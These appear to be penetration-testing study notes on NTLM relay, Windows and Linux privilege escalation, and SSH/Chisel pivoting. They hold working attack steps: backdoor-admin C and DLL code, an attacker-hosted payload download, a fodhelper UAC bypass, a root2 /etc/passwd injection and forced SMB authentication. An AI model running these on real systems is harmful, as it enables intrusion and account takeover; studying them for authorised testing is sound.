If we've **obtained code execution** on a remote system, force it to authenticate with us by commanding it to connect to our prepared SMB server.

Assuming our Responder is listening on `192.168.119.2`.

```pwsh
dir \\192.168.119.2\test
```

```bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

If we **don't have code execution**, use other vectors to force an authentication.

E.g., Enter a non-existing file with a UNC path like `\\192.168.119.2\share\nonexistent.txt` in a **file upload** form in a web application on a Windows server. If the web application supports uploads via **SMB**, the Windows server will authenticate to our SMB server.

### Relaying Net-NTLMv2

- If we cannot run Mimikatz to extract passwords, e.g. have access to **FILES01** as an **unprivileged** user.
- We also obtained Net-NTLMv2 hash the couldn't crack it.
- **SMB signing** is being set to False.

=> Try to use the hash on another machine, i.e. **relay attack** because the user may be a **local administrator on another machine**.

**ntlmrelayx** received an SMB connection and used it to authenticate to our target by relaying it

* --no-http-server: disable the HTTP server since we are relaying an SMB connection
* -smb2support: add support for SMB2
* -t: set the target to FILES02
* -c: set our command which will be executed on the target system as the relayed user

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

```pwsh
dir \\192.168.119.2\test
```

# Windows Privilege Escalation

Windows uses only the **SID** to identify principals for access control management.
- A SID is a unique value assigned to each entity, or principal, that can be authenticated by Windows, such as users and groups.

- The SID for local accounts and groups is generated by the Local Security Authority (LSA), and for domain users and domain groups, it's generated on a Domain Controller (DC).

- The SID string consists of different parts, delimited by "-"

`S-R-X-Y`

- R: stands for revision and is always set to "1"

- X: determines the **identifier authority** that issues the SID. E.g., 5 specifies **NT Authority** and is used for local or domain users and groups.

- Y: represents the **sub authorities** of the identifier authority. Every SID consists of one or more sub authorities. This part consists of the domain identifier and relative identifier (RID). 

  - The **domain identifier** is the SID of the domain for domain users, the SID of the local machine for local users. "32" for built-in principals.
  
  - The **relative identifier (RID)** determines principals such as users or groups.

E.g., SID of a local user with RID is 1001

`S-1-5-21-1336799502-1441772794-948155058-1001`

RID starts at 1000 for nearly all principals => This is the 2nd local user created on the system.

SIDs that have a RID under 1000 are called **well-known SIDs**. These SIDs identify **generic and built-in groups and users**.

## List of Well known SIDs on local machines

| **SID** | **Description** |
| ------- | --------------- |
| `S-1-0-0` | Nobody |
| `S-1-1-0` | Everybody |
| `S-1-5-11` | Authenticated Users |
| `S-1-5-18` | Local System |
| `S-1-5-domainidentifier-500` | Administrator |

Once a user is authenticated, Windows generates an **access token** that is assigned to that user. The token itself describes the **security context** of a given user.

The security context of a token consists of the SID of the user, SIDs of the groups the user is a member of, the user and group privileges, and information describing the scope of the token.

When a user starts a process or thread, a token will be assigned to these objects. This token, called a **primary token**, specifies which permissions the process or threads have when interacting with another object and is a copy of the access token of the user.

A **thread** can also have an **impersonation token** assigned. Impersonation tokens are used to provide a different security context than the process that owns the thread => The thread interacts with objects on behalf of the impersonation token instead of the primary token of the process.

Windows also implements **Mandatory Integrity Control**. It uses **integrity levels** (hierarchies of trust in a running application or securable object) to control access to securable objects.

When processes are started or objects are created, they receive the integrity level of the **principal** performing this operation.

- One exception is if an **executable file** has a low integrity level, the process's integrity level will also be low.
- A principal with a lower integrity level cannot write to an object with a higher level, even if the permissions would normally allow them to do so.

From Windows Vista onward, processes run on 4 integrity levels:

- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: very restricted rights often used in sandboxed processes or for directories storing temporary data

Display the integrity level of processes with **Process Explorer**

- For our current user with `whoami /groups`

- For files with `icacls`.

Switch to a high integrity level 

```bat
powershell.exe Start-Process cmd.exe -Verb runAs
```

**User Account Control (UAC)** protects the OS by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator.

An administrative user obtains 2 access tokens after a successful logon.

1. **Standard user token** (or filtered admin token) is used to perform all non-privileged operations.

2. **Regular administrator token** will be used when the user wants to perform a privileged operation. To leverage the administrator token, a **UAC consent prompt** needs to be confirmed.

Example **Built-in groups** include Administrators, **Backup Operators**, **Remote Desktop Users**, and **Remote Management Users**.

Members of:
- **Backup Operators** can backup and restore all files on a computer, even those files they don't have permissions for.
- **Remote Desktop Users** can access the system with RDP.
- **Remote Management Users** can access it with WinRM.

## Enumerating Windows

Key pieces of information to obtain:

- Username and hostname
- Group memberships of the current user
- Existing users and groups
- OS, version and architecture
- Network information
- Installed applications (Check 32-bit and 64-bit Program Files directories located in `C:\` and Downloads directory)
- Running processes

**Automated Enumeration tools**:

- winPEAS, https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- Seatbelt, https://github.com/GhostPack/Seatbelt
- JAWS, https://github.com/411Hall/JAWS

```bat
whoami /groups
```

```bat
net user
net user steve
net localgroup
```

```pwsh
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
```

```pwsh
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```pwsh
Get-Process
```

```bat
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```bat
ipconfig /all
route print
```

* -a: display all active TCP connections as well as TCP and UDP ports
* -n: disable name resolution
* -o: show the process ID for each connection

```bat
netstat -ano
netstat -anp TCP | find "2222"
```

```bat
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

List applications that do not use the Windows Installer

```bat
wmic product get name, version, vendor
```

List system-wide updates

```bat
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

* -u: suppress errors
* -w: search for write access permissions
* -s: perform a recursive search

```bat
accesschk.exe -uws "Everyone" "C:\Program Files"
```

Search for any object can be modified by members of the **Everyone** group

```pwsh
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

List all drives that are currently mounted + those that are physically connected but unmounted

```bat
mountvol
```

Enumerating Device Drivers and Kernel Modules

```pwsh
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
```

Request the version number of each loaded driver

```pwsh
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

Enumerating Binaries That AutoElevate (like SUID)

```bat
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

`https://github.com/pentestmonkey/windows-privesc-check`

* --dump: view output
* -G: list groups

```bat
windows-privesc-check2.exe --dump -G
```

Check Alex's mailbox: `C:\Users\alex\AppData\Roaming\Thunderbird\Profiles\<...>.default-release\Mail\mail.sandbox.local\Inbox`

## Hidden in Plain View

```pwsh
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```pwsh
Get-History
Clear-History
```

## Information Goldmine PowerShell

2 logging mechanisms for PowerShell are:

- **Transcription**, when enabled, the logged information is equal to what a person would obtain from looking over the shoulder of a user entering commands in PowerShell. The information is stored in transcript files, which are often saved in the home directories of users, a central directory for all users of a machine, or a network share collecting the files from all configured machines.

- **Script Block Logging** records commands and blocks of script code as events while executing. It records the full content of code and commands as they are executed. => such an event also contains the original representation of encoded code or commands.

Starting with PowerShell v5, v5.1, and v7, a module named **PSReadline** is included, which is used for line-editing and command history functionality.

`Clear-History` does **not** clear the command history recorded by **PSReadline**.

Administrators can prevent **PSReadline** from recording commands by setting

```pwsh
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```
 
Alternatively, they can clear the history file manually.

```pwsh
(Get-PSReadlineOption).HistorySavePath
```

Start a PowerShell Transcription with the path where the transcript file is stored

```pwsh
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Stop-Transcript
```

## UAC Bypass: fodhelper.exe Case Study

`fodhelper.exe` is a Microsoft support application responsible for managing language changes in the OS. Specifically, this application is launched whenever a local user selects the "Manage optional features" option in the "Apps & features" Windows Settings screen.

The `fodhelper.exe` binary runs as high integrity on Windows 10 1709.

Gather detailed information regarding the fodhelper integrity level and the permissions required to run this process by inspecting its **application manifest** (an XML file).

```bat
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```

**autoelevate** flag is set to true, which allows the executable to auto-elevate to high integrity without prompting the administrator user for consent.

**Process Monitor** is used to understand how a specific process interacts with the file system and the Windows registry. => Excellent tool for identifying flaws such as Registry hijacking, DLL hijacking, ...

After starting `procmon.exe`, run `fodhelper.exe` again and set filters to:

- "Process Name" is `fodhelper.exe`
- "Operation" contains "Reg"
- "Result" is "NAME NOT FOUND"

`fodhelper.exe` application attempts to query the `HKCU:\Software\Classes\ms-settings\shell\open\command` registry key.

```bat
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
```

`fodhelper.exe` attempts to query a value (**DelegateExecute**) stored in our newly-created **command** key. Since we do not want to hijack the execution through a COM object, add a **DelegateExecute** entry, leaving its value empty.

```bat
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```

When fodhelper discovers this empty value, it will look for a program to launch specified in the `Shell\Open\command\Default` key entry.

```bat
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```

## Leveraging Windows Services

Windows uses the **LocalSystem** (includes the SIDs of `NT AUTHORITY\SYSTEM` and `BUILTIN\Administrators` in its token), **Network Service**, and **Local Service** user accounts to run its own services.

Users or programs creating a service can choose either one of those accounts, a domain user, or a local user.

### Service Binary Hijacking

List of all installed Windows services

```bat
tasklist /SVC
```

```pwsh
Get-Service
```

When using a network logon such as **WinRM** or a **bind shell**, `Get-CimInstance` and `Get-Service` will result in a **permission denied** error when querying for services with a **non-administrative user**.

=> Using an interactive logon such as RDP solves this problem.

```pwsh
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

```bat
wmic service where caption="Serviio" get name, caption, state, startmode

wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
```

**Replacing the binary of a service** needs permissions.

```pwsh
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

`adduser.c`

```C
#include <stdlib.h>

int main ()
{
 int i;
 i = system ("net user dave2 password123! /add");
 i = system ("net localgroup administrators dave2 /add");
 return 0;
}
```

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```pwsh
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe

move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

```bat
net stop mysql
```

Get a list of all privileges (The **Disabled** state only indicates if the privilege is currently enabled for the running process)

```bat
whoami /priv
```

To issue a reboot, user needs to have the privilege **SeShutDownPrivilege** assigned.

```bat
shutdown /r /t 0
```

`PowerUp.ps1` check if it detects this privilege escalation vector.

Displays services the current user can modify, e.g. the service binary or configuration files

```pwsh
. .\PowerUp.ps1

Get-ModifiableServiceFile
Install-ServiceBinary -Name 'mysql'
```

### Service DLL Hijacking

Windows uses **Dynamic Link Libraries (DLL)**. On Unix systems, these files are called **Shared Objects**.

1. **Overwrite a DLL** the service binary uses (the service may not work as expected because the actual DLL functionality is missing. In most cases, this would still lead us to code execution of the DLL's code e.g., to create of a new local administrative user)

2. **Hijack the DLL search order**

The **search order** determines what to inspect first when searching for DLLs. By default, all current Windows versions have **safe DLL search mode** enabled.

Standard search order taken from the Microsoft Documentation:

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

When safe DLL search mode is **disabled**, the **current directory is searched at position 2** after the application's directory.

Display the contents of **PATH** environment variable

```pwsh
$env:path
```

**Missing DLL**, i.e., the binary attempted to load a DLL that doesn't exist on the system.

=> Try placing a malicious DLL (with the name of the missing DLL) in a path of the DLL search order so it executes when the binary is started.

**Process Monitor** displays real-time information about any process, thread, file system, or registry related activities but need **administrative privileges** to start

The standard procedure would be to **copy the service binary to a local machine**. Install the service locally and use Process Monitor with administrative privileges to list all DLL activity.

Our goal is to **identify all DLLs loaded by BetaService + detect missing ones** > Check their permissions and if they can be replaced with a malicious DLL. If find that a DLL is missing, try to provide our own DLL by adhering to the DLL search order.

**Create a filter** to only include events related to to the process BetaServ of the target service.

- `Process Name` is `BetaServ.exe` and `Include` as Action.

After applying the filter, the list is empty. Try **restarting the service** as the binary will then attempt to load the DLLs.

The **CreateFile** function can be used to create or open a file.

The CreateFile calls attempted to open a file named `myDLL.dll` in several paths. The Detail column states **NAME NOT FOUND** for these calls => a DLL with this name couldn't be found in any of these paths.

The consecutive function calls follow the DLL search order, starting with the directory the application is located in and ending with the directories in the **PATH** environment variable.

=> The service binary tries to locate a file called `myDLL.dll`, but fails to do so.

=> Write a DLL file with this name to a path used by the DLL search order.

Each DLL can have an optional entry point function named **DllMain**, which is executed when processes or threads attach the DLL. This function generally contains 4 cases named **DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH**.

These cases handle situations when the DLL is loaded or unloaded by a process or thread. They are commonly used to perform initialization tasks for the DLL or tasks related to exiting the DLL. If a DLL doesn't have a **DllMain** entry point function, it only provides resources.

`myDLL.cpp`

```C
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
 	        i = system ("net user dave2 password123! /add");
 	        i = system ("net localgroup administrators dave2 /add");
            break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
        case DLL_THREAD_DETACH: // A thread exits normally.
            break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

```pwsh
Restart-Service BetaService
```

### Unquoted Service Paths

When we have **Write permissions** to a service's main directory or subdirectories but **cannot replace files** within them.

Each Windows service maps to an executable file that will be run when the service is started. If the path of this file **contains one or more spaces and is not enclosed within quotation marks**, the **CreateProcess** function starts interpreting the path from left to right until a space is reached. For every space in the file path, the function uses the preceding part as **file name** by adding `.exe` and the rest as **arguments**.

E.g., An unquoted service binary path `C:\Program Files\My Program\My Service\service.exe`

When Windows starts the service, it will use the following order to try to start the executable file due to the spaces in the path:

- `C:\Program.exe`
- `C:\Program Files\My.exe`
- `C:\Program Files\My Program\My.exe`
- `C:\Program Files\My Program\My service\service.exe`

=> Create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and match its name to the interpreted filename. Then, once the service is started, our file gets executed with the same privileges that the service starts with. Often, this happens to be the **LocalSystem** account, which results in a successful privilege escalation attack.

```bat
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```pwsh
Start-Service GammaService
Stop-Service GammaService
```

```pwsh
. .\PowerUp.ps1

Get-UnquotedService
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

## Sheduled Tasks

Windows uses the **Task Scheduler** to execute various automated tasks, e.g. clean-up activities or update management.

**Scheduled Tasks, or Tasks** are defined with:

- A **trigger** is used as a condition, causing one or more actions to be executed when met. E.g., a trigger can be set to a specific time and date, at startup, at log on, or on a Windows event.

- An **action** specifies which program or script to execute.

3 pieces of information to obtain from a scheduled task (Author, TaskName, "Task To Run", "Run As User", and "Next Run Time" fields):

- As which user account (principal) does this task get executed? (e.g. If the task runs as `NT AUTHORITY\SYSTEM` or as an administrative user)

- What triggers are specified for the task? If the trigger condition was met in the past, the task will not run again in the future or if we are in a week-long penetration test, but the task runs after this time.

- What actions are executed when one or more of these triggers are met?

```bat
schtasks /query /fo LIST /v
```

## Using Exploits

**Abuse certain Windows privileges**

**Non-privileged** users with assigned privileges, such as **SeImpersonatePrivilege**, can potentially abuse those privileges to perform privilege escalation attacks.

Other privileges that may lead to privesc are **SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug**.

A user with **SeImpersonatePrivilege** privilege can perform operations in the security context of another user account under the right circumstances.

By default, Windows assigns this privilege to members of the **local Administrators group** + the device's **LOCAL SERVICE, NETWORK SERVICE, and SERVICE accounts**. 

Microsoft implemented this privilege to prevent unauthorized users from creating a service or server application to impersonating clients connecting to it. E.g., Remote Procedure Calls (RPC) or named pipes.

When we obtain code execution on a Windows system by exploiting a vulnerability in an **IIS** web server, in most configurations, IIS will run as LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity, which all have **SeImpersonatePrivilege** assigned. This also applies to other Windows services.

**Named pipes** are one method for **local or remote Inter-Process Communication** in Windows. They offer the functionality of 2 unrelated processes sharing and transferring data with each other.

A named pipe server can create a named pipe to which a named pipe client can connect via the specified name. The server and client don't need to reside on the same system. Once a client connects to a named pipe, the server can leverage **SeImpersonatePrivilege** to impersonate this client after capturing the authentication from the connection process.

=> Find a privileged process and coerce it into connecting to a controlled named pipe. With SeImpersonatePrivilege assigned, we can then impersonate the user account connecting to the named pipe and perform operations in its security context.

**PrintSpoofer** tool implements a variation of the printer bug to coerce `NT AUTHORITY\SYSTEM` into connecting to a controlled named pipe.

Where we have code execution as a user with the privilege **SeImpersonatePrivilege** to execute commands or obtain an interactive shell as `NT AUTHORITY\SYSTEM`.

Other tools that can abuse SeImpersonatePrivilege for privesc:

- Variants from the **Potato** family (e.g., RottenPotato, SweetPotato, or JuicyPotato (`https://github.com/ohpe/juicy-potato`)).

`https://github.com/itm4n/PrintSpoofer`

```pwsh
.\PrintSpoofer64.exe -i -c powershell.exe
```

3 mandatory arguments: -t, -p, and -l

* -t: the "Process creation mode". If we have the SeImpersonate privilege, pass the t value (CreateProcessWithToken)
* -p: the program we are trying to run.
* -l: an arbitrary port for the COM server to listen on

```bat
JuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837
```

# Linux Privilege Escalation

**LinEnum** and **LinPeas**

## Enumerating Linux

```bash
id
hostname
uname -a
cat /etc/issue
cat /etc/os-release
cat /proc/version
```

```bash
ls -l /etc/shadow
cat /etc/passwd
```

```bash
ps -ef
ps aux
ps -fC leafpad
```

```bash
ip a
ifconfig
ip addr

routel
route
ip route
```

* -a: list all connections
* -n: avoid hostname resolution
* -p: list the process name the connection belongs to

```bash
netstat
ss -anp
ss -ntplu
ss -antlp | grep sshd
```

On Linux-based systems, we must have root privileges to list firewall rules with **iptables**.

The **iptables-persistent** package on Debian Linux saves firewall rules in specific files under `/etc/iptables` by default. These files are used by the system to restore **netfilter** rules at boot time. These files are often left with weak permissions, allowing them to be read by any local user on the target system.

Search for files created by the `iptables-save` command, which is used to dump the firewall configuration to a file specified by the user. This file is then usually used as input for the `iptables-restore` command and used to restore the firewall rules at boot time.

If a system administrator had ever run this command, search the configuration directory (`/etc`) or grep the file system for iptables commands to locate the file.

Files created by the `iptables-save` command, which is used to dump the firewall configuration to a file specified by the user

```bash
cat /etc/iptables/rules.v4
```

System administrators often add their own scheduled tasks in the `/etc/crontab` file.

List cron jobs running

```bash
ls -lah /etc/cron*
cat /etc/crontab

crontab -l
sudo crontab -l
```

List applications installed by dpkg

```bash
dpkg -l
```

Search for every directory **writable** by the current user

```bash
find / -writable -type d 2>/dev/null
```

Lists all drives that will be mounted at boot time

```bash
cat /etc/fstab
```

Gather information about mounted drives

```bash
mount
```

View all available disks

```bash
lsblk
```

Gather a list of drivers and kernel modules that are loaded on the target

```bash
lsmod
```

Find out more about the specific module

```bash
/sbin/modinfo libata
```

Search for **SUID**-marked binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

`unix-privesc-check` supports "standard" and "detailed" mode

`https://github.com/pentestmonkey/unix-privesc-check`

```bash
./unix-privesc-check standard > output.txt
```

## Exposed Confidential Information

The `.bashrc` bash script is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.

From inside this script, additional **environment variables** can be specified to be automatically set whenever a new user's shell is spawned.

Sometimes system administrators store **credentials** inside environment variables as a way to interact with custom scripts that require authentication.

```bash
env
cat .bashrc
```

Custom configurations of sudo-related permissions can be applied in the `/etc/sudoers` file.

If the `/etc/sudoers` configurations are too permissive, a user could abuse it to obtain permanent root access.

```bash
sudo -l
```

```bash
watch -n 1 "ps -aux | grep pass"

sudo tcpdump -i lo -A | grep "pass"
sudo tcpdump -nvvvXi tun0 tcp port 8080
sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
```

## Abusing Cron Jobs

Inspect the cron log file (`/var/log/cron.log`) for running cron jobs

```bash
grep "CRON" /var/log/syslog
```

## Abusing Password Authentication

Historically, password hashes, along with other account information, were stored in the world-readable file `/etc/passwd`. For backwards compatibility, if a **password hash** is present in the **2nd column of an `/etc/passwd`** user record, it is considered valid for authentication and it takes precedence over the respective entry in `/etc/shadow`, if available.

=> If we can write into `/etc/passwd`, we can effectively set an arbitrary password for any account.

By default, if no other option is specified, `openssl` will generate a hash using the **crypt** algorithm, a supported hashing mechanism for Linux authentication, output: `Fdzt.eqJQ4s0g`

Create a **superuser** Linux account named root2 with password w00t

```bash
openssl passwd w00t

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Abusing Setuid Binaries and Capabilities

Find the PID (process ID) of the passwd program

```bash
ps u -C passwd
```

Provides a summary of the process (PID is 1932) attributes (Real UID, effective UID)

```bash
grep Uid /proc/1932/status
```

Enumerate for binaries with capabilities

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

**AppArmor** is a kernel module that provides **mandatory access control (MAC)** on Linux systems by running various application-specific profiles, and it's enabled by default on Debian 10.

Verify AppArmor's status

```bash
sudo aa-status
```

## Exploiting Kernel Vulnerabilities

```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

# Port Redirection and SSH Tunneling

## Port Forwarding with Linux Tools

**Socat** is **not** the only way to **create port forwards** on *NIX hosts:
- **rinetd** runs as a daemon, a better solution for longer-term port forwarding configurations, but is slightly unwieldy for temporary port forwarding solutions.

- combine **Netcat** and a **FIFO named pipe file** to create a port forward.

- If we have **root** privileges, use **iptables** to create port forwards. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "**1**" to `/proc/sys/net/ipv4/conf/[interface]/forwarding`.

Run this command on CONFLUENCE to open TCP port 2345 on the WAN interface of CONFLUENCE
- All the packets sent to this port will be forwarded by CONFLUENCE to TCP port 5432 on 10.4.50.215

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

```bash
sudo apt install rinetd
```

To redirect any traffic received by the Kali web server on port 80 to the google.com IP address

`/etc/rinetd.conf`

```
# bindadress    bindport  connectaddress  connectport
0.0.0.0 80 216.58.207.142 80
```

```bash
sudo service rinetd restart
```

## SSH Tunneling

In **local and dynamic port forwarding**
- the listening port is bound to the SSH client
- the packet forwarding being done by the SSH server

SSH **local port forward** as part of our SSH connection from CONFLUENCE to 10.4.50.215
- listen on all interfaces on port 4455 on CONFLUENCE (0.0.0.0:4455), then
- forward all packets (through the SSH tunnel) to port 445 on 172.16.50.217

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

**SSH dynamic port forwarding**
- The listening port that the SSH client creates is a **SOCKS proxy server port**. SOCKS is a proxying protocol. A SOCKS server accepts packets (with a SOCKS protocol header) and forwards them on to wherever they're addressed.

**Proxychains** uses the Linux shared object preloading technique (LD_PRELOAD) to hook libc networking functions within the binary that gets passed to it, and forces all connections over the configured proxy server.

=> it will work for most dynamically-linked binaries that perform simple network operations. It won't work on **statically-linked** binaries.

By default, Proxychains is configured with very **high time-out values**. Lowering the **tcp_read_time_out** and **tcp_connect_time_out** values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. => speed up port-scanning times.

ICMP host discovery will not work through the proxychains tunnel

SSH **dynamic port forward** as part of our SSH connection from CONFLUENCE to 10.4.50.215
- listen on all interfaces on port 9999 on CONFLUENCE (0.0.0.0:9999)
- update `/etc/proxychains4.conf`: `socks5 <CONFLUENCE's IP> 9999`

```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217

proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240
```

In **remote port forwarding**
- the listening port is bound to the SSH server
- packets are forwarded by the SSH client

**Remote dynamic port forwarding** has only been available since **OpenSSH 7.6**. Only the **OpenSSH client** needs to be version 7.6 or above to use it.

SSH **remote port forward** as part of our SSH connection from CONFLUENCE to Kali,
- listen on port 2345 on our Kali machine (127.0.0.1:2345), and
- forward all traffic to port 5432 on 10.4.50.215

```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

* -N: specify that we are not running any commands.
* -f: request ssh to go to the background.

```bash
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
```

SSH **remote dynamic port forward** as part of our SSH connection from CONFLUENCE to Kali,
- listen on port 9998 on our Kali machine,
- update `/etc/proxychains4.conf`: `socks5 127.0.0.1 9998`

```bash
ssh -N -R 9998 kali@192.168.118.4
```

In situations where we have **direct access to an SSH server**, behind which is a more complex internal network, classic **dynamic port forwarding** might be difficult to manage.

=> **sshuttle** is a tool that turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel. However, it requires **root** privileges on the **SSH client** and **Python3** on the **SSH server**.

1. Set up a port forward in a shell on CONFLUENCE (192.168.50.63), listening on port 2222 on the WAN interface and forwarding to port 22 on 10.4.50.215:

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

2. run sshuttle, specifying the SSH connection string, and the **subnets** that we want to tunnel through this connection (10.4.50.0/24 and 172.16.50.0/24)

```bash
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

## Port Forwarding with Windows Tools

On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in `%systemdrive%\Windows\System32\OpenSSH` location by default.

From the Windows machine, create a remote dynamic port forward to our Kali machine

```bat
ssh -N -R 9998 kali@192.168.118.4
```

### Plink

Before OpenSSH was available on Windows, most network administrators' tools of choice were **PuTTY** and its command-line-only counterpart, **Plink**. (Plink doesn't have is remote **dynamic** port forwarding)

Create a remote port forward using Plink, Port 9833 is opened on the loopback interface of our Kali machine

```bat
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

A prompt asking if we want to store the server key in the cache

```bat
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <Kali PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
```

### Netsh

The built-in firewall configuration tool **Netsh** (aka **Network Shell**) **requires administrative privileges** to create a port forward on Windows. We can set up a **port forward** with the **portproxy subcontext** within the interface context. (Like **Socat** on Linux)

Create a **port forward**:
- listen on port 2222 on the external-facing interface (listenaddress=192.168.50.64) and
- forward packets to port 22 on 10.4.50.215

```bat
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

Confirm that the port forward is stored

```bat
netstat -anp TCP | find "2222"

netsh interface portproxy show all
```

Allow connections on the local port (localport=2222) on the interface with the local IP address (192.168.50.64) using the TCP protocol, specifically for incoming traffic (dir=in)

```bat
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

Delete the firewall rule we just created and the port forward

```bat
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

# Tunneling Through Deep Packet Inspection

## HTTP Tunneling

A Deep Packet Inspection (DPI) solution is now **terminating all outbound traffic except HTTP**.
- All inbound ports on CONFLUENCE01 are blocked except TCP/8090.
- The only traffic that will reach our Kali machine is HTTP.

**Chisel** uses a client/server model. A Chisel server must be set up, which can accept a connection from the Chisel client. **Reverse port forwarding** option is particularly useful for us, which is similar to **SSH remote port forwarding**.

Chisel can run on macOS, Linux, and Windows, and on various architectures on each.

We will run a Chisel **server** on our Kali machine, which will accept a connection from a Chisel client running on CONFLUENCE.

- Chisel will bind a **SOCKS** proxy port on the Kali machine.

- The Chisel server will encapsulate whatever we send through the SOCKS port and push it through the HTTP tunnel, SSH-encrypted.

- The Chisel client will then decapsulate it and push it wherever it is addressed.

```bash
chisel server --port 8080 --reverse
```

Connect to the server running on our Kali machine (192.168.118.4:8080)
- Creating a reverse SOCKS tunnel (`R:socks`).

- The R prefix specifies a reverse tunnel using a socks proxy (which is bound to port **1080** by default).

- The remaining shell redirections (`> /dev/null 2>&1 &`) force the process to run in the background, which will free up our shell

```bash
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```

```bat
chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
```

**SSH** doesn't offer a generic **SOCKS proxy** command-line option. Instead, it offers the **ProxyCommand** configuration option. We can either write this into a configuration file, or pass it as part of the command line with -o. **ProxyCommand** accepts a shell command that is used to open a proxy-enabled channel.

